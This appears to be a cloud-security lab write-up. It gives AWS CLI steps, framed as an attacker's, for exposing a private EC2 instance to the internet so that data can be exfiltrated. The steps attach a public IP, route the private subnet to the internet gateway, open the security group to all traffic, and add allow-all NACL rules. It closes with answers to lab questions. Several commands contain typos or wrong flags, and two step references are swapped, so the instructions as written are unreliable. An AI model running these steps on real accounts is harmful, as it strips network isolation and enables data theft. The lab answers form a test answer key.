# AWS VPC - Data Exfiltration

## Assing a public IP address on the Target Instance
1. To allocate a new public IP address to the EC2 Instance in this account.

```bash
aws ec2 allocate-address
```

2. To find the ENI for the Target machine.

```bash
aws ec2 describe-instances > instances.json
grep eni instances.json
```

![image](https://github.com/user-attachments/assets/6ab0c564-c885-4221-8c79-e6f7caf46343)

3. Assign the public IP to the ENI of the target machine.

```bash
aws ec2 assocaite-address --network-interface-id $ENI (from step 1) --allocation-id $EIPALLOC (from step 2)
```

## Change Route Table allowing a private subnet direct Internet access
- After assigning public IP address to the EC2 instance, we need to establish a route form the Internet to the subnet target.
1. Get the IGW ID

```bash
aws ec2 describe-internet-gateways
```

2. Get the Route Table ID

```bash
aws ec2 desccribe-route-tables > route-tables.json
```

3. Add the route to the Route table

```bash
aws ec2 create-route --route-table-id $ROUTE_TABLE --destination-cidr-block 0.0.0.0/0 --gateway-id $IGW
```

4. Rerun the command to confirm the new route is added.

```bash
aws ec2 describe-route-tables
```

## Modify the security group to allow access to the world
- A new route has been established but the traffic is still blocked by the Security Group. We need to modify the Security Group.

```bash
aws ec2 describe-security-groups > security-gorups.json
```

- Look for the desired Security Group and create a security group to allow all traffic.

```bash
aws ec2 authorize-security-group-ingress --protocol all -port 0-65535 --cidr 0.0.0.0/0 --group-id $SG_ID
```

## Fix the NACLs to allow access
- Now we have to modify the NACLs to allow access to the resources.

```bash
aws ec2 describe-network-acls > nacls.json
```
![image](https://github.com/user-attachments/assets/8d937e40-daf3-4d24-8e1c-ed2a5932fdaa)

- From the above output, we see that only IP addresses in CIDR 10.100.0.0/21 can communicate with this VPC. As an attacker, we want to to modify the NACLs to allow VPC to communicate with the Internet by allowing ingress and egress traffic through 0.0.0.0/0

```bash
aws ec2 create-network-acl-entry --cidr-block 0.0.0.0/0 --ingress --protocol -1 --rule-action allow --rule-number 1 --network-acl-id $ACL_ID
```
- Because NACLs is stateless, we have to define egress traffic for the VPC.

```bash
aws ec2 create-network-acl-entry --cidr-block 0.0.0.0/0 --egress --protocol -1 --rule-action allo --rule-number 1 --network-acl-id $ACL_ID
```

- Run the following command to check the new NACL entry:

```bash
aws ec2 describe-network-acls --filters Name=network-acl-id,Values=$ACL_ID 
```


# ANSWER THE QUESTION
- **What was the value of "PublicIpv4Pool" in the aws ec2 allocate-address response?**

![image](https://github.com/user-attachments/assets/e5e23817-a53e-4a79-88da-4e249bad3ad9)

-> `amazon`

- **What was the Name of the IGW?**

![image](https://github.com/user-attachments/assets/5f99dea2-599c-4245-83b7-9b7fc8141505)

-> `VPC-Capstone-IGW`

- **How many Subnets are associated with the "VPC-Capstone Private Subnet NACL"?**

-> `2`
